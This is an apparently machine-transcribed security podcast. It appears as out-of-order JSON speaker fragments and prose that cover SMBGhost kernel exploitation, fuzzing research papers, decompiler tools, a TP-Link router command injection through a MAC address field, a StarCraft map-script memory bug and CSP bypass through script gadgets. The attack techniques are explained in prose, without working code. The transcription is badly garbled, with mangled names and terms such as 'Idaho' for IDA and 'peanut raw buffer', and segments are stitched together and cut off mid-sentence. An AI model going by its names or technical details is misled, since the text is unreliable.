talk about it\", \"start\": 7679.3}, {\"speaker\": 1, \"line\": \" yeah okay good yeah the yeah it's good to point out the episode number I couldn't remember the exact number so you know you need the read primitive to know where to write to because essentially the SMB ghost vulnerability the way they hit it it gave you an out of bounds memory corruption on the Heap through an integer overflow in the decompressed function and you can use that to get an arbitrary kernel right I'm not going to talk about that issue too much just because we already covered that in depth on episodes we talked to it episode 36 but what's important to note there is you can also hit other adjacent data with the memory corruption as well and one thing you can hit for example is like peanut raw buffer or some other member that gets copied to a response because your corruption is in the request packet so to other members contained in the same header are Pointers to mdl structures and mdl for those who don't know it stands for a memory descriptor list and what's important what's important about those is is they contain physical memory pointers so you know when you're talking about kernel-level you have two different types of memory you have virtual memory and physical memory so virtual memory gets mapped to physical memory and it's a lot easier to work with physical memory is the actual the real address if you want to call it that that contains the the data and what's important about that is physical memory is harder to randomize then virtual memory virtual memory with a slrs like that it's a lot easier to deal with and that actually comes into play here there's a reason they went with that ndl method so they fake these mbl's and they K user shared data because they're they're mapped to fix locations and both user land and Colonel so you don't have to deal with a SLR they're mapped in fixed locations so they talk about some of the walls they hit with while doing this and I won't cover all that hear those who are interested are free to look at the right up but suffice it to say they basically get arbitrary physical memory read through that that mdl method now I'm not experienced some windows but apparently hitting the page tables is a common exploit strategy and windows kernel exploitation which kind of makes sense page tables are are pretty powerful to mess with so because of that Microsoft tries randomizing the address of the PML for or page map level for self reference entry and they do that by randomizing the index the problem is that happens at the virtual memory level that doesn't happen at the physical memory level so while the wall the index is randomized the physical address of that entry is not randomized and that's why I was saying you know physical memory can be really powerful to hit at the kernel level if you can do it so it seems bios always had it at a hex one a a000 and UEFI always had it at x 1 AD 0 0 0 so now they can I can basically get arbitrary read write and what they ended up hitting was the hardware abstraction layer how they essentially searched the physical backing memory of the house Heap to find the interrupt controller and smash one of the function pointers for the interrupt controller there are some other challenges even after code execution specifically they highlighted they tried launching a user mode process but they had some struggles with that because Windows user land uses control flow guard CFG but you know I don't want to go into that too too much just because this is a pretty dense right up and I will say you you will probably need some in-depth Windows knowledge to be able to fully appreciate it to fully understand it that's why you know I don't want to go too much into those issues partially because I don't have a strong background in Windows and I don't think he does either so we can't go too much into exactly how all that works I don't want to say like things that are like over the incorrect or anything like that at overall though I thought it was cool right up it's fun to see how an LP e can be turned remote using clever tricks like abusing physical memory like that I

the right and they had an easy factor to turn that into an LP by grabbing the token or whatever I forget what they did in that one but they had that method so in this case like we just see a you know

very limited if it's not actually kind of looking for that so what they've introduced here is the idea of being able to do some annotation so it's mixing kind of that code coverage guiding with limited value guided coverage for trying to hit all the different values for something and they provide kind of a good example of kind of the Curren there I think it's either in this or it's in their

basically just has a switch on if you had wasd or you know up down left right it one of those characters it adjusts a single value the xry up or down and that's all it really does so by adding an annotation they're just saying like hey also do we value guided coverage on the X and Y values because getting code coverage you could hit those for code paths up down left right super easily you're going to get a complete code coverage there but you also want to get that coverage of those are all the possible X and Y values which is kind of where they come in adding annotations for that and so by adding an annotation thing like hey these values are also important fuzz those they found they were able to get they use Mario's the example they're able to get much deeper into it into in this case the like said they use Mario trying to be the different levels there if you get much deeper in there and actually complete most levels\", \"start\": 8086.7}, {\"speaker\": 1, \"line\": \" yeah so if you want to see some of the implementation stuff of like some of the helper functions they provide if you go to page 8 I think you had it up briefly they had like a listing of some of the functions you have so they have like I John comp I John hash in tashman hashtag all that kind of stuff and what you were saying with like testing on Mario they also had a table on the 10th page I want to say yeah the 10th page and they have like this little table comparing AFL well on its own along with I John in the AFL and all the Mario levels that could solve so like you could see AFL it only hit a hundred percent of the distance on a few of the levels where I jotted hit on all of the levels basic or\", \"start\": 8211.2}, {\"speaker\": 3, \"line\": \" not most of all levels is that said like I'll mention a I mean yes Super Mario Bros does seem like a bit of a weird yeah but I so doing a ion games isn't that weird though so I don't know I mean it is a little bit of fuzzing like it's definitely a weird Benchmark it's not unheard of though because he do cut you have a goal you have a very particular score like you have some that can prove it's doing that and it's just kind of a test test case of see it's getting deeper into it it's able to get that depth because we tell it to focus on this these particular types of\", \"start\": 8252.3}, {\"speaker\": 1, \"line\": \" values it's a lot easier to visualize to like yeah program coverage is a lot harder to visualize for somebody who's not familiar with the contents of the paper\", \"start\": 8294.5}, {\"speaker\": 3, \"line\": \" well it's also it's also like the between just code coverage which is just you know the control handle or hit all the buttons and you've got it all the code coverage versus kind of all the different areas also like it's it illustrates the difference between what it's fuzzing\", \"start\": 8303.2}, {\"speaker\": 1, \"line\": \" for yeah so I did want to cover some of the observations they made before they got into their implementation details which we just covered I think it I think there's some useful observations there so one thing they found was code coverage is sometimes overestimated and what it provides just because it'll keep hitting irrelevant State changes and that's why they say like a human who can identify and guide those State changes might be more useful which is why they provide those those helper functions and stuff another thing they found was it might not be obvious to a father what can actually influence the state and and to what degree and the last thing was sometimes you don't even have good State information to work with so one example they give is like magic bites for that AFL doesn't really know how to handle those so all of these things the paper authors are you could be improved by you know including an actual person in that equation so I like the idea I do have some questions though like you were saying earlier while Super Mario is fun I don't think it should really be used as a serious Benchmark I'd want to see how this performs and works on larger complex code bases they you know they kind of they say they tested it against a test hashmap implementation and amaze and Super Mario if they're going to be fuzzing things I want to see how it actually works in the real\", \"start\": 8319.4}, {\"speaker\": 3, \"line\": \" yeah I know they're out there all very toy\", \"start\": 8399.1}, {\"speaker\": 1, \"line\": \" evaluations yeah exactly the other thing is this seems too for one thing this wouldn't work for Black Box fuzzing because you need to insert these helper functions in the source code so Black Box fucking is out of the question with this\", \"start\": 8401.6}, {\"speaker\": 3, \"line\": \" paper I don't know maybe you can instrument them in there may I don't know if you can't that's that's purely speculation is if you can instrument them you know find a concave get that code in there and then instrument the calls out from there I met there's the possibility you could do that but yeah I mean right now you do have to compile it in there\", \"start\": 8416.8}, {\"speaker\": 1, \"line\": \" they're generally speaking you need a white box fuzzing approach and on top of that this requires quite a a bit of like human intervention right like you have to have the human looking at the state changes knowing when to wear to put in those functions they have to edit and recompile the source code every time they want to make a change this requires a lot of human effort and one of the big Boons of fuzzing is to try to move away from doing that you know you just let the fuzzer run while you do other stuff maybe you co dot it while you have the fuzzer running and you just kind of leave it sit there\", \"start\": 8434.8}, {\"speaker\": 3, \"line\": \" and because you do need a crate the test cases the test Corpus or the fuzzer so that this requires even more effort on top of that well yeah I was going to say that though you can kind of relate to that I feel like this is more were hybrid fuzzing would come in rather than annotations using like the constraint solving to find those other paths that it's not not being able to hit I feel like I feel like there's maybe something to doing the annotations for what's of Interest maybe in another way like I think there's something to the idea there for sure\", \"start\": 8466.8}, {\"speaker\": 1, \"line\": \" yeah I like the idea I'm just I just question how much it's actually going to be like people are going to want to use it you know what I mean\", \"start\": 8503.4}, {\"speaker\": 3, \"line\": \" all right I guess we'll see I kind of I question it to like I don't think it's going to be the next big thing I feel like that's kind of going towards more hybrid fuzzing\", \"start\": 8511.5}, {\"speaker\": 1, \"line\": \" yeah there was one quote though I really wanted to point out in the papers I thought it was kind of a cool quote it said computers are incredibly fast accurate and stupid humans are incredibly slow inaccurate but brilliant so that's why they're kind of marrying the idea of bringing the two together to try to find more\", \"start\": 8523.5}, {\"speaker\": 3, \"line\": \" issues yes and no like I do think like the annotations and a person who actually takes the time to do that because that's a big thing when it comes to fuzzing like if you take the time to get the right the perfect Corpus for testing with it usually pays off a lot when you actually put the human in there to get some of that worked on versus just automation there's definitely work being done to try and automate a lot of them but the human intelligence aspect of it I think is still important at least right now like it still plays a big part\", \"start\": 8543.2}, {\"speaker\": 1, \"line\": \" I do like I do think whoever gets stuck in that job though of just writing the stuff and maintaining the father would probably suck like I don't know if I want that as a job it does seem kind of like dry work well it's\", \"start\": 8577.1}, {\"speaker\": 3, \"line\": \" probably wouldn't just be you know a person who that's their only job I feel like that would just be like you do that as part of your initial setup ramping up on a project he do some of that to decide where you want the fuzzer to focus on set up some annotations or whatever and then otherwise it's more or less as normal it's you know part of that initial research phase and just getting up to speed on a new project\", \"start\": 8589.0}, {\"speaker\": 1, \"line\": \" our last topic before shed its is another fuzzing paper it's a Pangolin which is incremental hybrid fuzzing with polyhedral path abstraction It's About Soul yeah so revisiting something we've talked about before hybrid fuzzing so just because it's been a little while since we talked about it hybrid fuzzing is basically the idea of combining live fuzzing with symbolic execution to try to get better State tracking and overall\", \"start\": 8613.8}, {\"speaker\": 3, \"line\": \" coverage so not just that but can kolak execution is kind of important of concrete and symbolic execution I mean you did kind of say that with the live running but they take the live running they take kind of the register values again to functions they take on all that live data and then apply that into some contrary solving and using some symbolic execution on that concrete data that you've already gotten to help determine new seeds to determine new mutations and using that constraint solving to find ways into New\", \"start\": 8637.2}, {\"speaker\": 1, \"line\": \" Paths yeah so they note that existing hybrid father's can often get like super high overhead and lose efficiency we've covered some of the issues with hybrid buzzing before partially you know it can be hard to integrate with certain code bases because of you know the challenges that come with it but the problem that they point out is that the father is not able to keep track of the state when going deep into nested paths so you end up with the state not really being preserved when it could be useful so you get you end up with like these redundant recalculations of the state is how I read it and I think the part of the reason they do that is maybe to prevent State explosion on the like colic execution side of things but I'm not ya know\", \"start\": 8670.3}, {\"speaker\": 3, \"line\": \" that that's pretty much exactly why is State explosions kind of the big issue yeah\", \"start\": 8714.9}, {\"speaker\": 1, \"line\": \" so that's where the incremental part comes in the heart of their tool is to try to fix that problem it does get pretty mathy because they talk about their own term which is in the the title polyhedral path abstraction but I think it's basically used to try to help out and guide the smt constraint solving and try to guide the mutation for code coverage but it is you know when you're getting into constraint solving and stuff like that you can see like there's these equations with symbols that most people probably don't even know exist\", \"start\": 8720.6}, {\"speaker\": 3, \"line\": \" I mean if you've done like a intro computer science when you should get two Street math or discrete mathematics in there so you should be familiar with the logic symbols that said it is great mathematics well I don't think he did a CS the curry either no I didn't I'm basically saying if you have a degree it should be familiar which isn't a good level to be using that said I mean this is I would have more academic conference this paper was accepted to secured the IEEE security and privacy all friends 2020\", \"start\": 8749.9}, {\"speaker\": 1, \"line\": \" yeah so we can't cover too much of how that actual path abstraction and stuff works but you know for those who are interested in the math behind that it is there the link will be in description but overall it seems to be trying to solve a problem that has been plaguing hybrid fuzzing so it seems to be trying to do something novel so even though we can't cover it too in depth we did at least want to mention it in the podcast yeah it's like at\", \"start\": 8784.5}, {\"speaker\": 3, \"line\": \" least\", \"start\": 8813.8}, {\"speaker\": 1, \"line\": \" on the\", \"start\": 8814.4}, {\"speaker\": 3, \"line\": \" see I figured at least we could cover the gist of it here being that it is trying to kind of solve that keeping some history being able to kind of guide the mutation a bit through that history and guide something constraint solving like I said show myself something issues there it is a take on it unfortunately it was a little bit dense for us to kind of be able to give you guys the full details there but you know it's it's kind of Leading Edge of where some of that research is right now\", \"start\": 8814.5}, {\"speaker\": 1, \"line\": \" but it's basically the idea of using past information to predict future information that's like the whole I think\", \"start\": 8843.0}, {\"speaker\": 3, \"line\": \" this event I go with yeah yeah well that the path abstraction interface Sky their new novel area is kind of a using abstracting the paths that's saying through their way so that it doesn't even know like the whole thing it's a trip well it's abstracted away that said I think just rambling with that\", \"start\": 8850.1}, {\"speaker\": 1, \"line\": \" yeah so we'll move on to some shoutouts those EU had a shout out with more fussing stuff\", \"start\": 8871.6}, {\"speaker\": 3, \"line\": \" yeah well so when I first saw the paper and I will mention I forgot to mention when we gone I John that actually came that was mentioned by exp why on our Discord he's who first time link that out so I did want to give a shout out there sorry I forgot to do with that paper but when I was doing that I tried to find a good source for the paper figure out like how old it was and things like like that before I decide if we'd cover it or not and I came across this really cool GitHub which is literally just fuzzing paper and all this is a collection of recent fuzzing papers it's getting updated so I just wanted to kind of share that you know if you're interested in the fuzzing of research seems to have a good collection of them paying attention to what's coming out it's also just a good collection of fussing papers I also want to just put a question out to the community and just ask me aware of a similar repository for exploit development either just exploit mitigations or development or both or something along that because if that's not being done I think that would be interesting maybe start doing\", \"start\": 8877.1},

Okay, before we have some before we jump into topics, we do want to mention we have been getting transcripts tons. He's been working on that. So you'll find on our Blog the transcripts are up for the last episode and all the episodes going forward are going to have transcripts as well. They're not perfect. They are about\", \"start\": 43.0}, {\"speaker\": 2, \"line\": \" their General are far from perfect. I will say that right now like since we since I do have it on screen you can see on here there for anybody. It's from song.

I can't\", \"start\": 82.0}, {\"speaker\": 2, \"line\": \" be. Yeah, I saw it did during my test runs actually get zi, correct when I gave it the hints for it, but regardless, I mean it's definitely not good, but there's enough there that you know, you can control laughs for something of interest if you want links links to the video on the side to get what we actually Said about something just trying to be there for those of you who don't really want to listen to All two hours, but maybe want to find a particular topic, you know, it's in there. It's probably not going to get any more accurate anytime soon. This is already using like Google speech to each attack stuff using their premium versions of it. So this is probably as good as it's going to get for a while until somebody actually wants to manually do it.\", \"start\": 86.1}, {\"speaker\": 1, \"line\": \" Wait, what's what I found kind of funny but the transcripts was for some reason.

Well, so at the end of statements actually so kind of happens on this one here this starts off that we as we covered on Facebook research when I was talking about last episode.

Yeah, so with that being said we'll jump into some topics. So we're going to kind of revisit something here a little while ago. We talked about Corp.com. There was a Krebs article on it back in February and how Microsoft was basically kind of being extorted in a way to try to buy it for 1.7\", \"start\": 177.8}, {\"speaker\": 2, \"line\": \" and all that was episode 28. Yeah anybody who wants to look back and what we call him dead?\", \"start\": 197.3}, {\"speaker\": 1, \"line\": \" Yeah. So the reason for that is, you know, internal corporate networks will try to send like Scholes and data Corp.com due to defaults from all the way back in the 90s and the previous guy who the guy who owned it. Myk O'Connor he had it for 26 years and was trying to sell it for 1.7 million dollars and it seemed originally Microsoft wasn't going to buy it. They offered 20K for it like many years ago, but it didn't go through. Well, it seems Microsoft actually has now kind of bit the bullet and bought it. So, you know just kind of a follow-up to that story. We covered a little while ago. I think it's pretty cool.\", \"start\": 203.5}, {\"speaker\": 2, \"line\": \" I mean I still kind of think it feels very much like extortion at the same time me the fault here is like it is Microsoft's fall for choosing to use Corp.com as their default rather than you know, there are reserved in special use domain names dot invalid should always give you an NX domain return response Dolph Local Host is reserved. No RFC whatever for it should always return the loopback address da test. Like there are options here that could be used. That said maybe it wasn't at the time. I actually don't know when those rfc's came into play. But at least you know future updates. It should have been changed.\", \"start\": 239.4}, {\"speaker\": 1, \"line\": \" I mean, I think we're kind of an agreement that they shouldn't have had to but at the same time, you know, 1.7 million dollars kind of a drop in the bucket for Microsoft and I think it's it's still a good move by them, you know protect their customers and stuff like that.\", \"start\": 285.4}, {\"speaker\": 2, \"line\": \" So, yeah, it's a good move for them. But I just can't really stand behind the guy also try to sell it for\", \"start\": 298.5}, {\"speaker\": 1, \"line\": \" that.

So I mean like I do think Microsoft should have bought it bought it earlier. Yeah, it's like we talked about this. I mean, it just feels very much like extortion on that, you know saying how he's going to sell it if Microsoft doesn't buy it I can get him trying to get rid of it, but Yeah, I mean we like I said, this was episode 28 we spent spent a fair chunk of time talking about it actually.\", \"start\": 315.1}, {\"speaker\": 1, \"line\": \" Yeah, so you can go back and get the full conversation on that if you want a bit more insight into that but move on so usually when we cover the, you know, covid-19 stuff that's going on.

There's a particular user hack for good which was split here Bounty with a Charitable organization or with some charity.

Just you know, get to donate my conveniently. so, I mean imagine if hacker one were to decide, you know, if this was because this was important enough for them to put out the Blog post about who this months now, and actually I guess to be fair. I don't know if they put out this like every month of blog post with it. I don't recall seeing similar blog posts in the past stacker one is one of the blog's that I follow for this but assuming they don't they found this one to be a particular importance to mention this option to donate. Imagine if they were to just take off the top like a percent of their cock rather than saying like research Had to give out of their cup but hacker one which is going to donate a percent again, that would have a much greater impact.

So to be clear like they do add a convenience factor to making the donation. They're definitely going to be people that wouldn't have donated otherwise, so it is getting my same thing with the supermarket system.

It was just something, you know, it's not something I can take concretely one way or the other but it's been a while since we've had some releases and we have one right now and it's the red deck decompiler and it's hit version 4.0. So for those of you that don't know about rep tackett's decompiler based on llvm and it supports like a variety of architectures sports. X86 64 a rmp.

Yeah and also supports like other file formats like Pease elfs Mac OS so it supports like a lot of stuff but with 4.0 like you were just saying it's added even more support.

So\", \"start\": 686.8}, {\"speaker\": 2, \"line\": \" yeah, so it's the build system that I'm kind of most excited about so I've used wrecked actually for quite a while was kind of my go-to. The compiler, you know when I didn't have access to Ida so it was a so early on it was basically a web interface you can upload a file and it'll do the D compilation. They had an API also that actually tied in there's an Ida plug-in you can use so when they open source this I think it was like I want to say a few years back with maybe 2017 2018. They open source that it was an exciting thing because now you know, it would become a lot more useful the reality though was it was an absolute pain to use. So the new build system seems like it should make that easier. They basically Specter already mentioned me a lot more modular. They swapped out or got rid of all the shell scripts for Python scripts. Hopefully will be an improvement. I haven't been able to try it yet, but I'm hoping that will kind of improve the usability of it. And I think the Json output is an interesting they've added, you know instead of just Being able to pull out. The actual D compilation they basically got all the tokens that does put set in Jason form. So if you want to process with something else, you don't need a reprocess the decompiled output. It's already done that for you. And I just kind of removing One Step, but it makes it a lot more usable for the\", \"start\": 706.2}, {\"speaker\": 1, \"line\": \" machine. I will say it's really nice because I don't know if you'd want to argue with me on this point, but I'd say Jason is probably the best non-binary cereals serialization format.

It's fact that's adjacent support of all the tokens that it generated a me. I think that's kind of the key thing.

You do expect it to Output that not Jason. So the fact that you don't have to do that step. You just you get more accuracy out of fact, I think that's kind of a net positive for if you want integrate this as just a step in a further further workflow. They've made that a lot easier to\", \"start\": 821.3}, {\"speaker\": 1, \"line\": \" do. Yeah, basically they make it they made it so you cut you can still skip the step of parsing like Friday the lexical parser yourself it basically does that part for you, which is that really awesome because doing lexical parsing is like it is quite complex the other part that's pretty cool that they added as they actually have a library for now to they have like an official library for it. So and I think it has like bindings for a lot of the popular languages like, you know rust see golang so it's got a I think it's got a lot of those bindings if I remember right from when I looked at the GitHub for it, I'd say the library is probably the coolest part.

It's just far too expensive for most people so, you know this got some pipe people were thinking maybe we'll get I to with a decompiler for one architecture for a reduced price or something like that and it ended up being a disappointment.

I mean I saw this on Reddit, so it's going to Involved there, but you know the thing is I don't care. What I realized is. I don't think Ida has ever really had the Goodwill of the community. Ida has always been something as far as I've noticed. It's kind of just been something you begrudgingly have to use because it was the best thing available but nobody really liked x-rays as a company. Nobody really like the fact they were overcharging for it. And I mean as far as I can tell everybody's felt like they've been overcharging for this they've had the market Eminence and they've done nothing with it which is kind of the other thing. I mean, there isn't a law that you can kind of push with Ida that says our that shows how Ida has really innovated. I think at best you can pull out, you know, the wind graph the whole graphic system. I'm not sure this was before my time. I know the wind graph itself. Amen somewhere like the four dot something era so like early 2000 And I don't know if they were the first to do the graphing view or not.

Do they have big institutional clients might explain why they don't care about individual customers.

Maybe it won't or fix it yourself. Yeah, I mean you can do that. But so that is a big thing for Ida. They do have the market dominance. But what else can I get? NG is I don't feel like they've really innovate. They haven't really taken any good steps with that to be fair to them. They have had kind of that constant incremental upgrades. So I actually did go and look through the change long just to see if maybe I was missing something and people are definitely welcome to correct me on this. But as I was just kind of stepping through kind of the major releases and looking at the release information. There wasn't a ton the like, you know 6.0 with a big thing was the new GUI was using QT. Like our sorry, I think that might been 6.0. I pull it off. Yeah 6.1 though. It was like Android support utf-8 support 6.2. They had to GUI installer. If things like that, like, you know, especially jumping back on 6.1 with the font stuff like or with the text parsing like okay that makes sense to do. It's just nothing really stood out at any point. It's really being all that Innovative in the last, you know, 10 years. Maybe I'm mistaken on something. Maybe I just missed it, you know got stuck in my ways only using the features I use and that's it. But on the other hand though, you've got kedra which again, I mean, I'm not sure why I really pulled us being really Innovative with them, but they do have a good compiler. They don't have the Debugger, but what I will point out is binary ninja in the same price point as Idaho has plenty more offerings. In terms of that feature. Yeah, but the big thing in terms of like Innovation is that Intermediate Language the BNI else which right now they have the to the low-level the mid-level soon enough. They've been teasing it on Twitter is they'll have the high level which is effectively there decompiler. But so, you know at least binge are you've\", \"start\": 1311.6}, {\"speaker\": 1, \"line\": \" seen\", \"start\": 1456.3}, {\"speaker\": 2, \"line\": \" something new coming up something that's actually trying to innovate a bit and the ILS I think are really great idea.

And one thing I will say about the ILS while you're pulling that up is what also makes them really good is they have strong built-in plugin support to so like you can make plugins that can interface with the IL like very easily that is one like big thing with Benja is the the plug-in API is extremely strong and consistent unlike Ida's as well. Yeah. Yeah. I mean it's going to\", \"start\": 1475.4}, {\"speaker\": 2, \"line\": \" show like, yeah the plug-in API and step its effectively a first-class citizen here with in binary integer. But yeah, I was just going to pull up like the low-level IL basically just rewriting your assembly instruction to some that just slightly more readable, you know breaks out the conditionals breaks out the flags that are used. Industry right side has a very simple like if tracks you greater than 0 XE and shows you like the ethanol so I could just some really simple rewriting of it. The mid-level one goes just a little bit. Little bit higher giving you variables giving you some of the function calls. Just some basic ideas that are but it's really useful when you're just scanning. The instructions to be able to look that and then on the other hand instead of having the decompiler the ILS at least, you know on the low level IL it's a very unlikely to be lying to you about what anything stealing where's compilers definitely make wrong assumption. So you can jump through these different levels and you know, once they have a decompiler something doesn't quite make sense you jump back. He look oh, you know in the medium level 1 you can see it's actually not creating this structure. You don't have to jump. All the way back to the assembly.

Like Ida does not offer any sort of il-2 use. I don't think he'd refers anything like that either unless maybe throw plug-in, but not that I'm aware of. So just in terms of like trying to innovate at least binary Ninja 'he is one they're cheaper to they are actually making some attempt to innovate with what they're doing. So I need at this price point. Yeah, go ahead. I was just gonna say at the price point the personal student version of this is like half the price of Idaho more support although on that note. It's not multi-threaded. I think do you have you have a personal license Specter? I have a personal yet. I don't know. So how has the performance been kind of?

I think they've added analysis caching to the personal version as well. So So, you know there is a bit of that. It's kind of like Dedra in a sense. There's a bit of a overhead on the initial analysis time. But once that's done, you know, the binary ninja database file is built and then it's like, you know when you open it in the future all that stuff's already done for you.

And I think that is you know, that kind of answers the question of why now like wire Ida kind of trying to Push for this I think it's safe to say Ghidorah as well as Vector 35 announcing that decompiler coming for Ben. Shh like you were talking about earlier could be spurring that on a little bit and I've also been noticing that people in the industry are starting to switch even people from these companies you were talking about earlier.

You know, the I to book was just some that you'd also pick up why because you're going to be using Ida. Maybe it was just a given that has definitely changed in the last several years, you know, there's definitely been punished for people just aren't like it?s still kind of considered the best option but your sufficient with Deidre your sufficient with binary ninja other more affordable options and from that with newcomers to the field starting to use those other tools eventually, you know, they become professionals. They're not using God. Ida so over time I think we can see either becoming relegated those kind of like Pearl those people that have used it all the time and never really moved on but those are kind of keeping up. Yeah, I've noticed the same thing people are starting to move away. It's not in huge numbers. It's not like flocks of people are just suddenly not using Ida and even when they are it's usually like they still have a night out license, but they're personally like their daily driver is something else.

So, you know, you're going to need to know have a foundation and that to be able to read the But for people who are interested in that it's there. That being said though. I think we can move on to some exploits unless you have anything any final thoughts in sandbox on okay, so getting into some exploits. Our first one is from zi zi and it's a zi post about a command injection found in pain to own Tokyo from November 20 19. It was run one from Team flashback who is hitting the tp-link routers. We actually talked about pwned. Oh and a little bit on the podcast and we probably you know mention the This Be Tails of this team and this attack but this\", \"start\": 2258.5}, {\"speaker\": 2, \"line\": \" yeah, we usually don't get all the technical details until afterwards if we even get them.

But yeah, I don't really know what the distribution is at all when it comes to type Computing.\", \"start\": 2346.7}, {\"speaker\": 1, \"line\": \" Yeah, so this Damon seems to be for Bridging the Gap between their mobile app and the router which I think is their tp-link tether app. It could possibly also be for like the technicians who come in you'll notice sometimes they'll have iPads with proprietary apps for interfacing with the router and stuff like that, but it could just be or that tp-link tether app as well. If\", \"start\": 2356.4}, {\"speaker\": 2, \"line\": \" it was imagine. It's more likely towards that tp-link tether or some other consumer.

So one of these packet types that you were mentioning that they were reversing can trigger a the one mesh service which ends up parsing a Json payload. Load that you give to it which contains like credentials and stuff like that. So the MAC address for the slave device is one of them and that Mac address is copied to the stack and is then copied into a command buffer through sprintf, which gets passed to system though. You can kind of see their you know, they go into more detail about all this trucks involved and all the functions of passes through but basically what it ends up boiling down to is the MAC address gets copied into a buffer that's then passed to system or concatenated into a buffer that's\", \"start\": 2403.3}, {\"speaker\": 2, \"line\": \" Well, so it's placed placed into it. So it's placed into some lieu of code actually which ends up being called by System. But otherwise, you hit the key point there. It sends an encrypted blob of data that uses static encryption key that that's where the Jason's contained within it talks about something that talks about like their custom checksum method not entirely relevant to here as you said what's relevant though is it sends that Json object that could see Crabs that slave underscore Mac puts it into a variable and then here pulling up the coat relevant code. They'll see the s printf that as the system command had has that lieu of for matched. Well has the format string for the Mac equals and then for the Mac will go call system on it. So it's kind of in the middle fed. And that does come into play with how they actually solve this. But so when I say solve this one of the problems that they came up with is this looks like it would be a really straightforward. Command injection. It's calling system. You control some of the data going in there straightforward. The problem is that they're limited to about 12 bytes at a time because you know the size of a Mack itself plus their actual Escape so you can escape this as long as it's not doing a validation on the Mac, which it's not you can escape that with just the quotient semicolon, which is effectively what they do. They do the single quote to get out of the luau. Bat her to get off the Lua code semicolon and then whatever their payload is and then they'll kind of recreate the string. Basically, they'll come the last single quote is so the extra characters that are appended don't invalidate the command itself or don't kind of cause any issues with that. So they get appended onto the end which is so coming back to this.

Yeah, I was thinking like this could be a fun little challenge or maybe I've even done a challenge like this probably but yeah, they're so their solution there though is, you know, print def whatever character appended to another file which comes out in their example here printf a to file zi. Yeah print er, sorry building up the file one character at a time that requires 11 bite still one character. And then they show how I try to do a character that gets interpreted by the shell. You can't just do that with the printf without quotes. You need a quote. Whatever that character is. So you can you don't have enough bites left actually append.

Yeah, so we love game exploits just because there there's so much fun. You're combining exploits and games and finally, we have one after a little while and it's in Starcraft 1 Starcraft the one from 1998. Apparently, it was remastered and released in 2017. The bug is fairly old. It was originally patched and 1.13 in January of 2006, but it ended up resurfacing because in the remaster and 1.21 they introduce Andy. The emulator which basically reintroduced the bug and the reason it's called the EU debug is EU d stands for extended unit death and it was it was basically a parser bug in the map scripts that allowed relative read write and basically arbitrary right if you factor in where it's you know reading and writing to her sir bug or\", \"start\": 2816.2}, {\"speaker\": 2, \"line\": \" just like the one value just wasn't validated so when it would access an array, so it was a death counter.

So I apologize if I keep some wrong terms of but essentially you had that it would use just that unit type wasn't getting validate. So check the player ID. But Unity, you could basically provide any value into this actor. I guess. It's also important to mention that part of this comes down to the maps kind of supporting some scripting so people can Had their own story or introduce new game modes, and that's where people are able to set up and some actions that happen in response to things like in response some of the deaths. So in this case, I'll see if you can control one element of the array like what one index you're able to get to access anywhere in that array.

So, you know, it's one of those things you can see like a game exploit and those are those are decently common to try to pour it into cpf challenges just because it's kind of a a unique area.

But yeah, you know kind of a kind of a short little write-up. It's not a overly complex. Issue, but it does exist. So one of them bring up what we'll get into semantic web Gateway. So there was a white paper on packet Storm from Cody 16 and it's a nicely laid out paper that has sections on some environment information bug information. I kind of like how it was laid out and it's part of a miniseries. He's doing called hunting 0 days, which is it's kind of like a journal of real-world 0 days that he's came across and how he found them and whatnot. It sounds like an interesting concept.

They're all rated High usually with information disclosure. It's just information. So it's just confidentiality. Maybe maybe medium may be high, but you won't be able to impact Integrity or availability of the service. So the fact that that's all being changed their makes me think. Some sort of authentication or authorization information information that could directly be used to modify everything else which they kind of mention. It's highly sensitive information which could be used to compromise the vcenter server or other services which are dependent upon the Ender for authentication. So, yeah, we don't have the details on it, but I figured I'd one called out because I'm sure some of you are.

So let that's it your point but you know, it could be something that somebody might be interested in doing we'll move into some research though. Our first one is on bypassing modern xss mitigations with code reuse attacks, which is kind of cool. I haven't really heard of code reviews being used in a web context. Apparently. It's been a while around for a while since 2017 according to the article which is something fairly recent. And\", \"start\": 3694.3}, {\"speaker\": 2, \"line\": \" I'm 2017 to still pretty recent one comes to research. I mean, yeah, it was actually kind of new to me. Also, I mean technically so you've already matched this isn't new but at the same time it's a little bit different from my usual approach when dealing with CSP. It's usually looking for some weakness in the CSP header itself that lets you, you know inject something like defines what object or how you're going to get your code in there. Just some weakness. that whereas this Dimension is kind of about code reuse the idea of finding gadgets and existing libraries and reusing those in your injection to get around like if you have a CSP policy, you know restricted to only sell for something you'd find some Gadget or how to find Gadgets in. In the libraries that are already being used and reusing those for yourself. Like it's an interesting attack or interesting method. Yeah.\", \"start\": 3724.7}, {\"speaker\": 1, \"line\": \" I liked how they had some examples. They have an example of like an HTML page that sets a HTML element with a get parameter and shows how like the see it the CSP could be bypass. Their first example is a little bit contrived but it's something like if the page has a calculator you can use the Expression in that to inject existing page content somewhere else. At that excess us.\", \"start\": 3784.4}, {\"speaker\": 2, \"line\": \" Yeah, they do that. Obviously, they move right on from talking about that really simple case to using jQuery mobile. Yes, you include that library and you're able and the kind of they show a gadget from if you go to the 2017 paper, which they link they include kind of more information about some different gadgets and other\", \"start\": 3807.1}, {\"speaker\": 1, \"line\": \" libraries. But if you look they also they have like some examples of like the gadgets the types of gadgets you could use to bypass CSP and web application firewalls and stuff like that.

Yeah, so, you know, they they gave that real-world. But I thought this was really cool because when you hear code reuse you always think binary and this kind of makes you rethink that that hey you could use that in the web context as well and it absolutely makes sense and it brings kind of that new way of thinking to web which I always thought. I've always found web a little bit boring because it always seems like okay copy and paste from a cheat sheet if it works. Okay, cool. If it doesn't move on to something else, that's how I've kind of seen web for a while. But this kind of challenge is that thinking this Is this is bringing some of that binary thought process into web which I thought was like really cool and and it was new to me as well. Like obviously, you know, 2017 is when it was introduced, but it was new to me and I think it you said earlier to is new to you as well.\", \"start\": 3854.8}, {\"speaker\": 2, \"line\": \" So yeah, so I think it actually like 2017 was first paper on it.

Yeah.\", \"start\": 3949.0}, {\"speaker\": 2, \"line\": \" But yeah, it was definitely kind of like you get the concept like as soon as you say by passing modern excess mitigations with code reuse text.

I will touch on there as you were saying csb hasn't In much adoption, but where I think it's cool to is this can bypass more than just CSP you can use this to bypass web application firewalls.

